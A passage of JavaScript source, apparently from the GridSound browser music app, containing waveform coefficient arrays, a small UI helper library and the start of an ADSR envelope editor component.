-.000293, .000293, -.000293, .000293, -.000293, .000293, -.000293, .000293, -.000293, .000293, -.000293, .000293, -.000293, .000293, -.000293, .000292, -.000292, .000292, -.000292, .000292, -.000292, .000292, -.000292, .000292, -.000292, .000292, -.000292, .000292, -.000291, .000291, -.000291, .000291, -.000291, .000291, -.000291, .00029, -.00029, .00029, -.00029, .00029, -.00029, .000289, -.000289, .000289, -.000289, .000289, -.000288, .000288, -.000288, .000288, -.000288, .000287, -.000287, .000287, -.000287, .000286, -.000286, .000286, -.000286, .000285, -.000285, .000285, -.000284, .000284, -.000284, .000283, -.000283, .000283, -.000282, .000282, -.000282, .000281, -.000281, .000281, -.00028, .00028, -.00028, .000279, -.000279, .000278, -.000278, .000278, -.000277, .000277, -.000276, .000276, -.000276, .000275, -.000275, .000274, -.000274, .000273, -.000273, .000272, -.000272, .000271, -.000271, .00027, -.00027, .000269, -.000269, .000268, -.000268, .000267, -.000267, .000266, -.000266, .000265, -.000265, .000264, -.000263, .000263, -.000262, .000262, -.000261, .000261, -.00026, .000259, -.000259, .000258, -.000258, .000257, -.000256, .000256, -.000255, .000254, -.000254, .000253, -.000252, .000252, -.000251, .00025, -.00025, .000249, -.000248, .000248, -.000247, .000246, -.000245, .000245, -.000244, .000243, -.000243, .000242, -.000241, .00024, -.00024, .000239, -.000238, .000237, -.000236, .000236, -.000235, .000234, -.000233, .000232, -.000232, .000231, -.00023, .000229, -.000228, .000228, -.000227, .000226, -.000225, .000224, -.000223, .000222, -.000222, .000221, -.00022, .000219, -.000218, .000217, -.000216, .000215, -.000214, .000214, -.000213, .000212, -.000211, .00021, -.000209, .000208, -.000207, .000206, -.000205, .000204, -.000203, .000202, -.000201, .0002, -.000199, .000198, -.000197, .000196, -.000195, .000194, -.000193, .000192, -.000191, .00019, -.000189, .000188, -.000187, .000186, -.000185, .000184, -.000183, .000182, -.000181, .00018, -.000179, .000177, -.000176, .000175, -.000174, .000173, -.000172, .000171, -.00017, .000169, -.000168, .000166, -.000165, .000164, -.000163, .000162, -.000161, .00016, -.000159, .000157, -.000156, .000155, -.000154, .000153, -.000152, .00015, -.000149, .000148, -.000147, .000146, -.000144, .000143, -.000142, .000141, -.00014, .000138, -.000137, .000136, -.000135, .000134, -.000132, .000131, -.00013, .000129, -.000127, .000126, -.000125, .000124, -.000122, .000121, -.00012, .000119, -.000117, .000116, -.000115, .000114, -.000112, .000111, -.00011, .000108, -.000107, .000106, -.000105, .000103, -.000102, .000101, -.000099, .000098, -.000097, .000095, -.000094, .000093, -.000092, .00009, -.000089, .000088, -.000086, .000085, -.000084, .000082, -.000081, .00008, -.000078, .000077, -.000076, .000074, -.000073, .000071, -.00007, .000069, -.000067, .000055, -.000054, .000053, -.000052, .00005, -.000049, .000048, -.000047, .000046, -.000045, .000044, -.000042, .000041, -.00004, .000039, -.000038, .000037, -.000036, .000034, -.000033, .000032, -.000031, .00003, -.000029, .000027, -.000026, .000025, -.000024, .000023, -.000022, .000021, -.000019, .000018, -.000017, .000016, -.000015, .000014, -.000012, .000011, -.00001, .000009, -.000008, .000007, -.000005, .000004, -.000003, .000002, -.000001, 0, .000002, -.000003, .000004, -.000005, .000006, -.000007, .000009, -.00001, .000011, -.000012, .000013, -.000014, .000016, -.000017, .000018, -.000019, .00002, -.000021, .000023, -.000024, .000025, -.000026, .000027, -.000028, .000029, -.000031, .000032, -.000033, .000034, -.000035, .000036, -.000038, .000039, -.00004, .000041, -.000042, .000043, -.000044, .000046, -.000047, .000048, -.000049, .00005, -.000051, .000052, -.000054, .000055, -.000056, .000057, -.000058, .000059, -.00006, .000061, -.000062, .000064, -.000065, .000066, -.000067, .000068, -.000069, .00007, -.000071, .000072, -.000074, .000075, -.000076, .000077, -.000078, .000079, -.00008, .000081, -.000082, .000083, -.000084, .000085, -.000087, .000088, -.000089, .00009, -.000091, .000092, -.000093, .000094, -.000095, .000096, -.000097, .000098, -.000099, .0001, -.000101, .000102, -.000103, .000104, -.000105, .000106, -.000107, .000108, -.000109, .00011, -.000111, .000112, -.000113, .000114, -.000115, .000116, -.000117, .000118, -.000119, .00012, -.000121, .000122, -.000123, .000124, -.000125, .000126, -.000127, .000128, -.000129, .000129, -.00013, .000131, -.000132, .000133, -.000134, .000135, -.000136, .000137, -.000138, .000138, -.000139, .00014, -.000141, .000142, -.000143, .000144, -.000144, .000145, -.000146, .000147, -.000148, .000149, -.000149, .00015, -.000151, .000152, -.000153, .000153, -.000154, .000155, -.000156, .000157, -.000157, .000158, -.000159, .00016, -.00016, .000161, -.000162, .000163, -.000163, .000164, -.000165, .000165, -.000166, .000167, -.000168, .000168, -.000169, .00017, -.00017, .000171, -.000172, .000172, -.000173, .000174, -.000174, .000175, -.000175, .000176, -.000177, .000177, -.000178, .000178, -.000179, .00018, -.00018, .000181, -.000181, .000182, -.000182, .000183, -.000184, .000184, -.000185, .000185, -.000186, .000186, -.000187, .000187, -.000188, .000188, -.000189, .000189, -.00019, .00019, -.00019, .000191, -.000191, .000192, -.000192, .000193, -.000193, .000193, -.000194, .000194, -.000195, .000195, -.000195, .000196, -.000196, .000196, -.000197, .000197, -.000197, .000198, -.000198, .000198, -.000199, .000199, -.000199, .000199, -.0002, .0002, -.0002, .0002, -.000201, .000201, -.000201, .000201, -.000201, .000202, -.000202, .000202, -.000202, .000202, -.000203, .000203, -.000203, .000203, -.000203, .000203, -.000203, .000204, -.000204, .000204, -.000204, .000204, -.000204, .000186, -.000186, .000186, -.000186, .000186, -.000186, .000186, -.000186, .000186, -.000186, .000186, -.000186, .000186, -.000186, .000186 ],  imag: [ 0, .670914, 0, 0, -.000005, 0, 0, .000011, 0, 0, -.000012, 0, 0, .000014, 0, 0, -.000021, 0, 0, .000023, 0, 0, -.00003, 0, 0, .000026, 0, 0, -.000039, 0, 0, .000054, 0, 0, -.000071, 0, -.000002, .000017, -.000017, .000018, -.000019, .00002, -.00002, .000021, -.000022, .000022, -.000023, .000023, -.000024, .000024, -.000025, .000025, -.000026, .000027, -.000028, .000029, -.000027, .000027, -.000028, .000029, -.00003, .00003, -.000031, .000032, -.000031, .000031, -.000032, .000033, -.000034, .000034, -.000035, .000036, -.000037, .000031, -.000032, .000032, -.000033, .000034, -.000034, .000035, -.000036, .000036, -.000037, .000038, -.000036, .000037, -.000037, .000038, -.000039, .000039, -.00004, .000041, -.000041, .000042, -.000043, .000044, -.000044, .000045, -.000044, .000045, -.000046, .000046, -.000047, .000048, -.000048, .000049, -.00005, .00005, -.000051, .000052, -.000053, .000053, -.000054, .000055, -.000056, .000056, -.000057, .000058, -.000058, .000059, -.00006, .000061, -.000061, .000062, -.000063, .000064, -.000065, .000065, -.000066, .000067, -.000068, .000068, -.000069, .00007, -.000071, .000072, -.000072, .000073, -.000074, .000075, -.000078, .000079, -.00008, .00008, -.000081, .000082, -.000083, .000084, -.000085, .000086, -.000086, .000087, -.000088, .000089, -.00009, .000091, -.000092, .000093, -.000093, .000094, -.000095, .000096, -.000097, .000098, -.000099, .0001, -.000101, .000102, -.000106, .000107, -.000108, .000108, -.000109, .00011, -.000111, .000112, -.000113, .000114, -.000115, .000116, -.000117, .000118, -.000119, .00012, -.000121, .000122, -.000123, .000124, -.000125, .000126, -.000127, .000128, -.000129, .00013, -.000131, .000132, -.000133, .000134, -.000135, .000136, -.000137, .000138, -.000139, .00014, -.00015, .000151, -.000153, .000154, -.000155, .000156, -.000157, .000158, -.000159, .00016, -.000161, .000163, -.000164, .000165, -.000166, .000167, -.000168, .000169, -.000171, .000172, -.000173, .000174, -.000175, .000176, -.000178, .000179, -.00018, .000181, -.000182, .000183, -.000185, .000186, -.000187, .000188, -.000189, .000191, -.000192, .000193, -.000194, .000195, -.000197, .000198, -.000199, .0002, -.000201, .000203, -.000204, .000205, -.000206, .000207, -.000209, .00021, -.000211, .000212, -.000214, .000222, -.000223, .000224, -.000225, .000227, -.000228, .000229, -.000231, .000232, -.000233, .000234, -.000236, .000237, -.000238, .00024, -.000241, .000242, -.000244, .000245, -.000246, .000248, -.000249, .00025, -.000252, .000253, -.000254, .000256, -.000257, .000258, -.00026, .000261, -.000262, .000264, -.000265, .000266, -.000268, .000269, -.00027, .000272, -.000273, .000275, -.000276, .000277, -.000279, .00028, -.000281, .000283, -.000284, .000286, -.000287, .000288, -.00029, .000291, -.000293, .000294, -.000295, .000297, -.000298, .0003, -.000301, .000302, -.000304, .000305, -.000307, .000308, -.000309, .000311, -.000312, .000314, -.000315, .000317, -.000318, .000319, -.000321, .000322, -.000324, .000325, -.000327, .000328, -.000329, .000331, -.000332, .000334, -.000335, .000337, -.000338, .00034, -.000341, .000343, -.000344, .000345, -.000347, .000348, -.00035, .000351, -.000353, .000354, -.000356, .000357, -.000359, .00036, -.000362, .000363, -.000365, .000366, -.000368, .000369, -.000371, .000372, -.000374, .000375, -.000377, .000378, -.00038, .000381, -.000383, .000384, -.000386, .000387, -.000389, .00039, -.000392, .000393, -.000395, .000396, -.000398, .000399, -.000401, .000402, -.000404, .000405, -.000407, .000408, -.00041, .000411, -.000413, .000415, -.000416, .000418, -.000419, .000421, -.000422, .000424, -.000425, .000427, -.000428, .00043, -.000432, .000433, -.000435, .000436, -.000438, .000439, -.000441, .000442, -.000444, .000446, -.000447, .000449, -.00045, .000452, -.000453, .000455, -.000457, .000458, -.00046, .000461, -.000463, .000464, -.000466, .000323, -.000325, .000326, -.000327, .000328, -.000329, .00033, -.000331, .000332, -.000333, .000334, -.000336, .000337, -.000338, .000339, -.00034, .000341, -.000342, .000343, -.000344, .000346, -.000347, .000348, -.000349, .00035, -.000351, .000352, -.000353, .000354, -.000356, .000357, -.000358, .000382, -.000383, .000384, -.000385, .000386, -.000388, .000389, -.00039, .000391, -.000392, .000393, -.000395, .000396, -.000397, .000398, -.000399, .000401, -.000402, .000403, -.000404, .000405, -.000407, .000408, -.000409, .00041, -.000411, .000413, -.000414, .000415, -.000416, .000417, -.000419, .00042, -.000421, .000422, -.000423, .000425, -.000426, .000427, -.000428, .000429, -.000431, .000432, -.000433, .000434, -.000436, .000437, -.000438, .000439, -.00044, .000442, -.000443, .000444, -.000445, .000446, -.000448, .000449, -.00045, .000451, -.000452, .000454, -.000455, .000456, -.000457, .000458, -.00046, .000461, -.000462, .000463, -.000465, .000466, -.000467, .000468, -.000469, .000471, -.000472, .000473, -.000474, .000475, -.000477, .000478, -.000479, .00048, -.000482, .000483, -.000484, .000485, -.000486, .000488, -.000489, .00049, -.000491, .000492, -.000494, .000495, -.000496, .000497, -.000498, .0005, -.000501, .000502, -.000503, .000505, -.000506, .000507, -.000508, .000509, -.000511, .000512, -.000513, .000514, -.000515, .000517, -.000518, .000519, -.00052, .000521, -.000523, .000524, -.000525, .000526, -.000527, .000529, -.00053, .000531, -.000532, .000533, -.000535, .000536, -.000537, .000538, -.000539, .000541, -.000542, .000543, -.000544, .000545, -.000547, .000548, -.000549, .00055, -.000551, .000553, -.000554, .000555, -.000556, .000557, -.000559, .00056, -.000561, .000562, -.000563, .000564, -.000516, .000517, -.000518, .000519, -.00052, .000521, -.000522, .000523, -.000524, .000526, -.000527, .000528, -.000529, .00053, -.000531, .000532, -.000533, .000534, -.000535, .000536, -.000537, .000538, -.000539, .00054, -.000542, .000543, -.000544, .000545, -.000546, .000547, -.000548, .000549, -.00055, .000551, -.000552, .000553, -.000554, .000555, -.000556, .000557, -.000558, .000559, -.00056, .000561, -.000563, .000564, -.000565, .000566, -.000567, .000568, -.000569, .00057, -.000571, .000572, -.000573, .000574, -.000575, .000576, -.000577, .000578, -.000579, .00058, -.000581, .000582, -.000583, .000584, -.000585, .000586, -.000587, .000588, -.000589, .00059, -.000591, .000592, -.000593, .000594, -.000595, .000596, -.000597, .000598, -.000599, .0006, -.000601, .000602, -.000603, .000604, -.000605, .000606, -.000607, .000608, -.000609, .00061, -.000611, .000612, -.000613, .000614, -.000615, .000615, -.000616, .000617, -.000618, .000619, -.00062, .000621, -.000622, .000623, -.000624, .000625, -.000626, .000627, -.000628, .000629, -.00063, .000631, -.000631, .000632, -.000633, .000634, -.000635, .000636, -.000637, .000638, -.000639, .00064, -.000641, .000641, -.000642, .000643, -.000644, .000645, -.000646, .000647, -.000648, .000649, -.000649, .00065, -.000651, .000652, -.000653, .000654, -.000655, .000655, -.000656, .000657, -.000658, .000659, -.00066, .000661, -.000661, .000662, -.000663, .000664, -.000665, .000571, -.000572, .000572, -.000573, .000574, -.000574, .000575, -.000576, .000577, -.000577, .000578, -.000579, .000579, -.00058, .000581, -.000581, .000582, -.000583, .000583, -.000584, .000585, -.000585, .000586, -.000587, .000587, -.000588, .000589, -.000589, .00059, -.000591, .000591, -.000592, .000592, -.000593, .000594, -.000594, .000595, -.000596, .000596, -.000597, .000597, -.000598, .000599, -.000599, .0006, -.0006, .000601, -.000602, .000602, -.000603, .000603, -.000604, .000604, -.000605, .000606, -.000606, .000607, -.000607, .000608, -.000608, .000609, -.00061, .00061, -.000611, .000611, -.000612, .000612, -.000613, .000613, -.000614, .000614, -.000615, .000615, -.000616, .000616, -.000617, .000617, -.000618, .000618, -.000619, .000619, -.00062, .00062, -.000621, .000621, -.000622, .000622, -.000623, .000623, -.000624, .000624, -.000625, .000625, -.000625, .000626, -.000626, .000627, -.000627, .000628, -.000628, .000628, -.000629, .000629, -.00063, .00063, -.00063, .000631, -.000631, .000632, -.000632, .000632, -.000633, .000633, -.000634, .000634, -.000634, .000635, -.000635, .000635, -.000636, .000636, -.000636, .000637, -.000637, .000637, -.000638, .000638, -.000638, .000639, -.000639, .000639, -.00064, .00064, -.00064, .00064, -.000641, .000641, -.000641, .000642, -.000642, .000642, -.000642, .000643, -.000643, .000643, -.000643, .000644, -.000644, .000644, -.000644, .000644, -.000645, .000645, -.000645, .000645, -.000645, .000646, -.000646, .000646, -.000646, .000646, -.000647, .000647, -.000647, .000647, -.000647, .000647, -.000648, .000648, -.000648, .000648, -.000648, .000648, -.000648, .000648, -.000649, .000649, -.000649, .000649, -.000649, .000649, -.000649, .000649, -.000649, .000649, -.000649, .000649, -.00065, .00065, -.00065, .00065, -.00065, .000575, -.000575, .000575, -.000575, .000575, -.000575, .000575, -.000575, .000575, -.000575, .000575, -.000575, .000575, -.000575, .000575, -.000574, .000574, -.000574, .000574, -.000574, .000574, -.000574, .000574, -.000574, .000574, -.000574, .000574, -.000574, .000574, -.000573, .000573, -.000573, .000573, -.000573, .000573, -.000573, .000573, -.000572, .000572, -.000572, .000572, -.000572, .000572, -.000572, .000571, -.000571, .000571, -.000571, .000571, -.00057, .00057, -.00057, .00057, -.00057, .000569, -.000569, .000569, -.000569, .000568, -.000568, .000568, -.000568, .000567, -.000567, .000567, -.000567, .000566, -.000566, .000566, -.000566, .000565, -.000565, .000565, -.000564, .000564, -.000564, .000563, -.000563, .000563, -.000562, .000562, -.000562, .000561, -.000561, .000561, -.00056, .00056, -.000559, .000559, -.000559, .000558, -.000558, .000557, -.000557, .000557, -.000556, .000556, -.000555, .000555, -.000554, .000554, -.000553, .000553, -.000553, .000552, -.000552, .000551, -.000551, .00055, -.00055, .000549, -.000549, .000548, -.000548, .000547, -.000547, .000546, -.000545, .000545, -.000544, .000544, -.000543, .000543, -.000542, .000542, -.000541, .00054, -.00054, .000539, -.000539, .000538, -.000537, .000537, -.000536, .000535, -.000535, .000534, -.000534, .000533, -.000532, .000532, -.000531, .00053, -.00053, .000529, -.000528, .000527, -.000527, .000526, -.000525, .000525, -.000524, .000523, -.000522, .000522, -.000521, .00052, -.000519, .000519, -.000518, .000517, -.000516, .000516, -.000515, .000514, -.000513, .000512, -.000512, .000511, -.00051, .000509, -.000508, .000507, -.000507, .000506, -.000505, .000504, -.000503, .000502, -.000501, .000501, -.0005, .000499, -.000498, .000497, -.000496, .000495, -.000494, .000493, -.000492, .000491, -.00049, .000489, -.000489, .000488, -.000487, .000486, -.000485, .000484, -.000483, .000482, -.000481, .00048, -.000479, .00041, -.000409, .000408, -.000407, .000406, -.000405, .000404, -.000403, .000403, -.000402, .000401, -.0004, .000399, -.000398, .000397, -.000396, .000395, -.000394, .000393, -.000392, .000391, -.00039, .000389, -.000388, .000387, -.000386, .000385, -.000384, .000383, -.000382, .000381, -.00038, .000379, -.000378, .000377, -.000376, .000375, -.000374, .000373, -.000372, .000371, -.00037, .000369, -.000368, .000367, -.000366, .000364, -.000363, .000362, -.000361, .00036, -.000359, .000358, -.000357, .000356, -.000354, .000353, -.000352, .000351, -.00035, .000349, -.000348, .000346, -.000345, .000344, -.000343, .000342, -.000341, .000339, -.000338, .000337, -.000336, .000335, -.000333, .000332, -.000331, .00033, -.000328, .000327, -.000326, .000325, -.000324, .000322, -.000321, .00032, -.000318, .000317, -.000316, .000315, -.000313, .000312, -.000311, .00031, -.000308, .000307, -.000306, .000304, -.000303, .000302, -.0003, .000299, -.000298, .000296, -.000295, .000294, -.000292, .000291, -.00029, .000288, -.000287, .000286, -.000284, .000283, -.000281, .00028, -.000279, .000277, -.000276, .000274, -.000273, .000272, -.00027, .000269, -.000267, .000266, -.000265, .000263, -.000262, .00026, -.000259, .000257, -.000256, .000255, -.000253, .000252, -.00025, .000249, -.000247, .000246, -.000244, .000243, -.000241, .00024, -.000238, .000237, -.000235, .000234, -.000232, .000231, -.000229, .000228, -.000226, .000225, -.000223, .000222, -.00022, .000219, -.000217, .000215, -.000214, .000212, -.000211, .000209, -.000208, .000206, -.000205, .000203, -.000201, .0002, -.000198, .000197, -.000195, .000194, -.000192, .00019, -.000189, .000187, -.000186, .000184, -.000182, .000181, -.000179, .000177, -.000176, .000174, -.000173, .000171, -.000169, .000168, -.000166, .000164, -.000163, .000161, -.00016, .000158, -.000156, .000155, -.000153, .000151, -.00015, .000148, -.000146, .000145, -.000143, .000141, -.00014, .000138, -.000136, .000135, -.000133, .000131, -.000129, .000128, -.000126, .000124, -.000123, .000121, -.000119, .000118, -.000116, .000114, -.000112, .000111, -.000109, .000107, -.000106, .000104, -.000102, .0001, -.000099, .000097, -.000095, .000094, -.000092, .00009, -.000088, .000087, -.000085, .000083, -.000081, .00008, -.000078, .000076, -.000074, .000052, -.000051, .000049, -.000048, .000047, -.000046, .000044, -.000043, .000042, -.000041, .000039, -.000038, .000037, -.000036, .000034, -.000033, .000032, -.000031, .000029, -.000028, .000027, -.000025, .000024, -.000023, .000022, -.00002, .000019, -.000018, .000017, -.000015, .000014, -.000013, .000012, -.00001, .000009, -.000008, .000007, -.000005, .000004, -.000003, .000001, 0, -.000001, .000002, -.000004, .000005, -.000006, .000007, -.000009, .00001, -.000011, .000012, -.000014, .000015, -.000016, .000018, -.000019, .00002, -.000021, .000023, -.000024, .000025, -.000026, .000028, -.000029, .00003, -.000031, .000033, -.000034, .000035, -.000036, .000038, -.000039, .00004, -.000041, .000043, -.000044, .000045, -.000046, .000048, -.000049, .00005, -.000051, .000053, -.000054, .000055, -.000056, .000058, -.000059, .00006, -.000061, .000063, -.000064, .000065, -.000066, .000068, -.000069, .00007, -.000071, .000072, -.000074, .000075, -.000076, .000077, -.000079, .00008, -.000081, .000082, -.000083, .000085, -.000086, .000087, -.000088, .000089, -.000091, .000092, -.000093, .000094, -.000095, .000097, -.000098, .000099, -.0001, .000101, -.000103, .000104, -.000105, .000106, -.000107, .000108, -.00011, .000111, -.000112, .000113, -.000114, .000115, -.000117, .000118, -.000119, .00012, -.000121, .000122, -.000123, .000125, -.000126, .000127, -.000128, .000129, -.00013, .000131, -.000132, .000134, -.000135, .000136, -.000137, .000138, -.000139, .00014, -.000141, .000142, -.000143, .000145, -.000146, .000147, -.000148, .000149, -.00015, .000151, -.000152, .000153, -.000154, .000155, -.000156, .000157, -.000158, .000159, -.00016, .000161, -.000162, .000163, -.000165, .000166, -.000167, .000168, -.000169, .00017, -.000171, .000172, -.000173, .000174, -.000174, .000175, -.000176, .000177, -.000178, .000179, -.00018, .000181, -.000182, .000183, -.000184, .000185, -.000186, .000187, -.000188, .000189, -.00019, .000191, -.000191, .000192, -.000193, .000194, -.000195, .000196, -.000197, .000198, -.000199, .000199, -.0002, .000201, -.000202, .000203, -.000204, .000205, -.000205, .000206, -.000207, .000208, -.000209, .000209, -.00021, .000211, -.000212, .000213, -.000213, .000214, -.000215, .000216, -.000217, .000217, -.000218, .000219, -.00022, .00022, -.000221, .000222, -.000222, .000223, -.000224, .000225, -.000225, .000226, -.000227, .000227, -.000228, .000229, -.000229, .00023, -.000231, .000231, -.000232, .000233, -.000233, .000234, -.000234, .000235, -.000236, .000236, -.000237, .000237, -.000238, .000239, -.000239, .00024, -.00024, .000241, -.000241, .000242, -.000243, .000243, -.000244, .000244, -.000245, .000245, -.000246, .000246, -.000247, .000247, -.000248, .000248, -.000248, .000249, -.000249, .00025, -.00025, .000251, -.000251, .000252, -.000252, .000252, -.000253, .000253, -.000254, .000254, -.000254, .000255, -.000255, .000255, -.000256, .000256, -.000256, .000257, -.000257, .000257, -.000258, .000258, -.000258, .000258, -.000259, .000215, -.000216, .000216, -.000216, .000216, -.000216, .000217, -.000217, .000217, -.000217, .000217, -.000218, .000218, -.000218, .000218, -.000218, .000218, -.000218, .000219, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.00022, .00022, -.00022, .00022, -.00022, .00022, -.00022, .00022, -.00022, .00022, -.00022, .00022, -.00022, .00022, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000219, .000219, -.000218, .000218, -.000218, .000218, -.000218, .000218, -.000218, .000218, -.000217, .000217, -.000217, .000217, -.000217, .000216, -.000216, .000216, -.000216, .000216, -.000215, .000215, -.000215, .000215, -.000214, .000214, -.000214, .000214, -.000213, .000213, -.000213, .000212, -.000212, .000212, -.000211, .000211, -.000211, .000211, -.00021, .00021, -.000209, .000209, -.000209, .000208, -.000208, .000208, -.000207, .000207, -.000206, .000206, -.000206, .000205, -.000205, .000204, -.000204, .000203, -.000203, .000203, -.000202, .000202, -.000201, .000201, -.0002, .0002, -.000199, .000199, -.000198, .000198, -.000197, .000197, -.000196, .000196, -.000195, .000194, -.000194, .000193, -.000193, .000192, -.000192, .000191, -.00019, .00019, -.000189, .000189, -.000188, .000187, -.000187, .000186, -.000185, .000185, -.000184, .000183, -.000183, .000182, -.000181, .000181, -.00018, .000179, -.000179, .000178, -.000177, .000177, -.000176, .000175, -.000174, .000174, -.000173, .000172, -.000171, .000171, -.00017, .000169, -.000168, .000168, -.000167, .000166, -.000165, .000164, -.000164, .000163, -.000162, .000161, -.00016, .000159, -.000159, .000158, -.000157, .000156, -.000155, .000154, -.000153, .000153, -.000152, .000151, -.00015, .000149, -.000148, .000147, -.000146, .000145, -.000144, .000144, -.000143, .000142, -.000141, .00014, -.000139, .000138, -.000137, .000136, -.000135, .000134, -.000133, .000132, -.000131, .00013, -.000129, .000128, -.000127, .000126, -.000125, .000124, -.000123, .000122, -.000121, .00012, -.000119, .000118, -.000117, .000116, -.000115, .000114, -.000113, .000112, -.000111, .00011, -.000108, .000107, -.000106, .000105, -.000104, .000103, -.000102, .000101, -.0001, .000099, -.000098, .000096, -.000095, .000094, -.000093, .000092, -.000091, .00009, -.000089, .000087, -.000086, .000085, -.000084, .000083, -.000082, .000081, -.000079, .000078, -.000077, .000076, -.000075, .000074, -.000072, .000071, -.00007, .000069, -.000068, .000066, -.000065, .000064, -.000063, .000062, -.00006, .000059, -.000058, .000057, -.000056, .000054, -.000053, .000052, -.000051, .00005, -.000048, .000047, -.000046, .000045, -.000044, .000042, -.000041, .00004, -.000039, .000037, -.000036, .000035, -.000034, .000032, -.000031, .00003, -.000029, .000027, -.000026, .000025, -.000024, .000023, -.000021, .00002, -.000017, .000016, -.000015, .000014, -.000013, .000011, -.00001, .000009, -.000008, .000007, -.000006, .000005, -.000003, .000002, -.000001 ] } ],

].forEach( ( [ name, w ] ) => {
	const imag = w.imag || w.real.map( () => 0 ),
		real = w.real || w.imag.map( () => 0 );

	real[ 0 ] =
	imag[ 0 ] = 0;
	gswaPeriodicWaves.list.set( name, Object.freeze( {
		real: new Float32Array( real ),
		imag: new Float32Array( imag ),
	} ) );
} );

const GSUI = {

	noop() {},
	dragshield: document.createElement( "gsui-dragshield" ),

	// .........................................................................
	dispatchEvent( el, component, eventName, ...args ) {
		el.dispatchEvent( new CustomEvent( "gsuiEvents", {
			bubbles: true,
			detail: { component, eventName, args },
		} ) );
	},
	listenEvent( el, cbs ) {
		el.addEventListener( "gsuiEvents", e => {
			const d = e.detail,
				cbs2 = cbs[ d.component ] || cbs.default,
				fn = cbs2[ d.eventName ] || cbs2.default;

			if ( fn && fn( d, e ) !== true ) {
				e.stopPropagation();
				e.stopImmediatePropagation();
			}
		} );
	},

	// .........................................................................
	_templates: new Map(),
	setTemplate( tmpId, fn ) {
		GSUI._templates.set( tmpId, fn );
	},
	getTemplate( tmpId, ...args ) {
		return GSUI._templates.get( tmpId )( ...args );
	},

	// .........................................................................
	createElement( tag, attr, ...children ) {
		return GSUI._createElement( document.createElement( tag ), attr, children );
	},
	createElementNS( tag, attr, ...children ) {
		return GSUI._createElement( document.createElementNS( "http://www.w3.org/2000/svg", tag ), attr, children );
	},
	_createElement( el, attr, children ) {
		if ( attr ) {
			Object.entries( attr ).forEach( kv => GSUI.setAttribute( el, ...kv ) );
		}
		el.append( ...children.flat( 1 ).filter( Boolean ) );
		return el;
	},

	// .........................................................................
	_resizeMap: new Map(),
	observeSizeOf( el, fn ) {
		if ( GSUI._resizeMap.has( el ) ) {
			GSUI._resizeMap.get( el ).push( fn );
		} else {
			GSUI._resizeMap.set( el, [ fn ] );
		}
		GSUI._resizeObs.observe( el );
	},
	unobserveSizeOf( el, fn ) {
		const fns = GSUI._resizeMap.get( el ),
			fnInd = fns.indexOf( fn );

		GSUI._resizeObs.unobserve( el );
		if ( fnInd > -1 ) {
			fns.splice( fnInd, 1 );
			if ( fns.length === 0 ) {
				GSUI._resizeMap.delete( el );
			}
		}
	},
	_resizeObsCallback( entries ) {
		entries.forEach( e => GSUI._resizeMap.get( e.target )
			.forEach( fn => fn( e.contentRect.width, e.contentRect.height ) ) );
	},

	// .........................................................................
	unselectText() {
		window.getSelection().removeAllRanges();
	},
	setAttribute( el, attr, val = "" ) {
		val === false || val === null || val === undefined
			? el.removeAttribute( attr )
			: el.setAttribute( attr, val === true ? "" : val );
	},
};

GSUI._resizeObs = new ResizeObserver( GSUI._resizeObsCallback );

document.body.prepend( GSUI.dragshield );

class gsuiDragshield extends HTMLElement {
	connectedCallback() {
		this.classList.add( "gsuiDragshield" );
	}
	show( cursor ) {
		if ( cursor ) {
			this.style.cursor = cursor;
		}
		this.classList.add( "gsuiDragshield-show" );
	}
	hide() {
		this.style.cursor = "";
		this.classList.remove( "gsuiDragshield-show" );
	}
}

customElements.define( "gsui-dragshield", gsuiDragshield );

GSUI.setTemplate( "gsui-envelope", () => {
	return [
		GSUI.createElement( "div", { class: "gsuiEnvelope-head" },
			GSUI.createElement( "label", { class: "gsuiEnvelope-toggle", title: "Toggle envelope" },
				GSUI.createElement( "input", { class: "gsuiEnvelope-toggleCheckbox", name: "gsuiEnvelope-toggle", type: "checkbox" } ),
				GSUI.createElement( "i", { class: "gsuiEnvelope-toggleIcon gsuiIcon", "data-icon": "toggle" } ),
			),
			GSUI.createElement( "span", { class: "gsuiEnvelope-title" }, "Env" ),
		),
		[
			[ "attack", "attack", "att", 0, 1, .01 ],
			[ "hold", "hold", "hold", 0, 1, .01 ],
			[ "decay", "decay", "dec", 0, 1, .01 ],
			[ "substain", "substain", "sub", 0, 1, .01 ],
			[ "release", "release", "rel", 0, 4, .01 ],
		].map( ( [ clazz, title, text, min, max, step ] ) => (
			GSUI.createElement( "div", { class: `gsuiEnvelope-prop gsuiEnvelope-${ clazz }`, title },
				GSUI.createElement( "div", { class: "gsuiEnvelope-propLabel" },
					GSUI.createElement( "span", null, text ),
					GSUI.createElement( "div", { class: "gsuiEnvelope-propValue" } ),
				),
				GSUI.createElement( "div", { class: "gsuiEnvelope-propContent" },
					GSUI.createElement( "gsui-slider", { type: "linear-x", min, max, step, "mousemove-size": "800" } ),
				),
			)
		) ),
		GSUI.createElement( "div", { class: "gsuiEnvelope-graph" },
			GSUI.createElement( "gsui-beatlines", { coloredbeats: "" } ),
		),
	].flat( 1 );
} );

class gsuiEnvelope extends HTMLElement {
	constructor() {
		const children = GSUI.getTemplate( "gsui-envelope" ),
			elWave = children[ 1 ].firstChild,
			beatlines = children[ 6 ].firstChild,
			sliders = Object.freeze( {
				attack: [ children[ 1 ].lastChild.firstChild, children[ 1 ].firstChild.lastChild ],
				hold: [ children[ 2 ].lastChild.firstChild, children[ 2 ].firstChild.lastChild ],
				decay: [ children[ 3 ].lastChild.firstChild, children[ 3 ].firstChild.lastChild ],
				substain: [ children[ 4 ].lastChild.firstChild, children[ 4 ].firstChild.lastChild ],
				release: [ children[ 5 ].lastChild.firstChild, children[ 5 ].firstChild.lastChild ],
			} );

		super();
		this._children = children;
		this._wave = elWave.firstChild;
		this._sliders = sliders;
		this._beatlines = beatlines;
		this._dur = 4;
		this._waveWidth = 300;
		this._dispatch = GSUI.dispatchEvent.bind( null, this, "gsuiEnvelope" );
		this._onresize = this._onresize.bind( this );
		Object.seal( this );

		this.onchange = this._onchangeForm.bind( this );
		this._initSlider( "attack" );
		this._initSlider( "hold" );
		this._initSlider( "decay" );
		this._initSlider( "substain" );
		this._initSlider( "release" );
	}

	// .........................................................................
	connectedCallback() {
		if ( this._children ) {
			this.classList.add( "gsuiEnvelope" );
			this.append( ...this._children );
			this._children = null;
		}
		GSUI.observeSizeOf( this, this._onresize );
	}
	disconnectedCallback() {
		GSUI.unobserveSizeOf( this, this._onresize );
	}
	static get observedAttributes() {
